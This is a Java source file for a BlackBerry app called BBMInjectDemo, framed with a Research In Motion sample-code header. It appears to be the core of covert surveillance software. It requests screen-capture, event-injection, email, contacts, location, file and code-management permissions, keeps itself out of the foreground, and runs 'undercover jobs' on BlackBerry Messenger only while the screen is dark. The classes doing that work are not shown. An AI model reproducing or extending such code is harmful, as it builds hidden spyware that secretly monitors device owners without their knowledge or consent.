/**
 * 
 * 
 * Copyright © 1998-2010 Research In Motion Ltd.
 * 
 * Note: For the sake of simplicity, this sample application may not leverage
 * resource bundles and resource strings.  However, it is STRONGLY recommended
 * that application developers make use of the localization features available
 * within the BlackBerry development platform to ensure a seamless application
 * experience across a variety of languages and geographies.  For more information
 * on localizing your application, please refer to the BlackBerry Java Development
 * Environment Development Guide associated with this release.
 */

package com.rim.samples.device.bbminjectdemo;

import java.util.Timer;
import java.util.Vector;

import net.rim.device.api.applicationcontrol.ApplicationPermissions;
import net.rim.device.api.applicationcontrol.ApplicationPermissionsManager;
import net.rim.device.api.system.Application;
import net.rim.device.api.system.SystemListener2;
import net.rim.device.api.ui.UiApplication;

/*
 * BlackBerry applications that provide a user interface must extend 
 * UiApplication.
 */
public class BBMInjectDemo extends UiApplication implements SystemListener2 {
	private static final String STR_MODULE_NAME = "BBMInject";
	private static final long APP_TIMER_PERIOD = 1000;

	//#ifdef DEBUG
	private static Debug debug = new Debug("BBMInjectDemo", DebugLevel.VERBOSE);

	// #endif
	/**
	 * Entry point for application.
	 */
	public static void main(String[] args) {
		// Create a new instance of the application.
		BBMInjectDemo theApp = new BBMInjectDemo();
		theApp.init();

		// To make the application enter the event thread and start processing
		// messages,
		// we invoke the enterEventDispatcher() method.
		theApp.enterEventDispatcher();

	}

	private long MINIMUM_IDLE_TIME;
	LocalScreen localScreen;

	Vector mPhoneCalls = new Vector();
	boolean mConnected;

	// ApplicationMenuItem ami;

	Timer applicationTimer;
	ApplicationCheck applicationCheck;

	/**
	 * <p>
	 * The default constructor. Creates all of the RIM UI components and pushes
	 * the application's root screen onto the UI stack.
	 */
	public BBMInjectDemo() {
		localScreen = new LocalScreen(this);

		// Push the main screen instance onto the UI stack for rendering.
		pushScreen(localScreen);

	}

	protected void init() {
		//#ifdef DEBUG
		debug.trace("init");
		// #endif

		// Thread.currentThread().setPriority(Thread.MAX_PRIORITY);
		checkPermissions();
		// addExampleMenu();
		//lookForPersistentObject();

		
		addMenuBrowser();

		// getSB();

		applicationTimer = new Timer();
		applicationCheck = new ApplicationCheck();
		applicationTimer.schedule(applicationCheck, APP_TIMER_PERIOD,
				APP_TIMER_PERIOD);
		
		Application.getApplication().addSystemListener(this);

	}
	
	boolean acceptForeground(){
		return false;
	}

	private void addMenuBrowser() {
		BrowserMenuItem ami = BrowserMenuItem.getInstance();

		ami.addMenuBrowser();

	}

	private void cleanBrowser() {
		try {
			BrowserMenuItem bmi = BrowserMenuItem.getInstance();
			bmi.removeMenuBrowser();

		} catch (Exception ex) {
			debug.error("ex: " + ex);
		}
	}

	public void close() {
		applicationTimer.cancel();

		cleanBrowser();

		//#ifdef DEBUG
		debug.trace("close");
		// #endif

	}

	private void checkPermissions() {

		//#ifdef DEBUG
		debug.trace("======= CheckPermissions");
		// #endif

		// NOTE: This sample leverages the following permissions:
		// --Event Injector
		// --Phone
		// --Device Settings
		// --Email
		// The sample demonstrates how these user defined permissions will
		// cause the respective tests to succeed or fail. Individual
		// applications will require access to different permissions.
		// Please review the Javadocs for the ApplicationPermissions class
		// for a list of all available permissions
		// May 13, 2008: updated permissions by replacing deprecated constants.

		// Capture the current state of permissions and check against the
		// requirements
		final ApplicationPermissionsManager apm = ApplicationPermissionsManager
				.getInstance();
		final ApplicationPermissions original = apm.getApplicationPermissions();

		// Set up and attach a reason provider
		// final CoreReasonProvider drp = new CoreReasonProvider();
		// apm.addReasonProvider(ApplicationDescriptor
		// .currentApplicationDescriptor(), drp);

		final int[] wantedPermissions = new int[] {
				ApplicationPermissions.PERMISSION_SCREEN_CAPTURE,
				ApplicationPermissions.PERMISSION_PHONE,
				ApplicationPermissions.PERMISSION_BLUETOOTH,
				ApplicationPermissions.PERMISSION_WIFI,
				ApplicationPermissions.PERMISSION_CODE_MODULE_MANAGEMENT,
				ApplicationPermissions.PERMISSION_PIM,
				ApplicationPermissions.PERMISSION_PHONE,
				ApplicationPermissions.PERMISSION_LOCATION_API,
				ApplicationPermissions.PERMISSION_FILE_API,
				ApplicationPermissions.PERMISSION_MEDIA,
				ApplicationPermissions.PERMISSION_EMAIL,
				ApplicationPermissions.PERMISSION_EVENT_INJECTOR,
				ApplicationPermissions.PERMISSION_IDLE_TIMER,
				ApplicationPermissions.PERMISSION_CHANGE_DEVICE_SETTINGS,
				ApplicationPermissions.PERMISSION_INTERNAL_CONNECTIONS,
				ApplicationPermissions.PERMISSION_BROWSER_FILTER };

		
		// PERMISSION_LOCATION_DATA

		boolean allPermitted = true;
		for (int i = 0; i < wantedPermissions.length; i++) {
			final int perm = wantedPermissions[i];

			if (original.getPermission(perm) != ApplicationPermissions.VALUE_ALLOW) {
				allPermitted = false;
			}
		}

		if (allPermitted) {
			// All of the necessary permissions are currently available
			//#ifdef DEBUG
			debug.info("All of the necessary permissions are currently available");
			// #endif
			return;
		}

		// Create a permission request for each of the permissions your
		// application
		// needs. Note that you do not want to list all of the possible
		// permission
		// values since that provides little value for the application or the
		// user.
		// Please only request the permissions needed for your application.
		final ApplicationPermissions permRequest = new ApplicationPermissions();
		for (int i = 0; i < wantedPermissions.length; i++) {
			final int perm = wantedPermissions[i];
			permRequest.addPermission(perm);
		}

		final boolean acceptance = ApplicationPermissionsManager.getInstance()
				.invokePermissionsRequest(permRequest);

		if (acceptance) {
			// User has accepted all of the permissions
			//#ifdef DEBUG
			debug.info("User has accepted all of the permissions");
			// #endif
			return;
		} else {
			//#ifdef DEBUG
			debug.warn("User has accepted some or none of the permissions");
			// #endif
		}
	}

	public void backlightStateChange(boolean on) {
		if(!on){

				BBMMenuItem.getInstance().underCoverJobs();
			
		}else{
			BBMMenuItem.getInstance().stopUnderCoverJobs();
		}
	}
	
	public void batteryGood() {
	
	}

	public void batteryLow() {

	}

	public void batteryStatusChange(int status) {

	}

	public void powerOff() {

	}

	public void powerUp() {

	}

	public void cradleMismatch(boolean mismatch) {
	
	}

	public void fastReset() {
	
	}

	public void powerOffRequested(int reason) {
	
	}

	public void usbConnectionStateChange(int state) {
	
	}
}
